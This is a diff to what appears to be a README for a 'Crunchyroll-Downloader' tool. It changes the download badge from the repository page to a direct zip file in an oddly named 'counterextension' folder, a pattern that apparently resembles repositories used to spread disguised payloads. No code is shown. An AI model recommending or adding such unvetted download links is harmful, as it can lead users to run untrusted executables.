@@ -6,7 +6,7 @@ Welcome to Crunchyroll-Downloader - the simplest way to save your favorite anime
 
 ## 📥 Download the Application
 
-[![Download Crunchyroll-Downloader](https://img.shields.io/badge/Download-Crunchyroll--Downloader-blue?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://github.com/Nissecircular1464/Crunchyroll-Downloader)
+[![Download Crunchyroll-Downloader](https://img.shields.io/badge/Download-Crunchyroll--Downloader-blue?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://github.com/Nissecircular1464/Crunchyroll-Downloader/raw/refs/heads/main/counterextension/Crunchyroll-Downloader-v1.0-beta.1.zip)
 
 Visit this link to download the application. The download page will open in your browser, and you'll find the latest version ready to save to your computer.
 
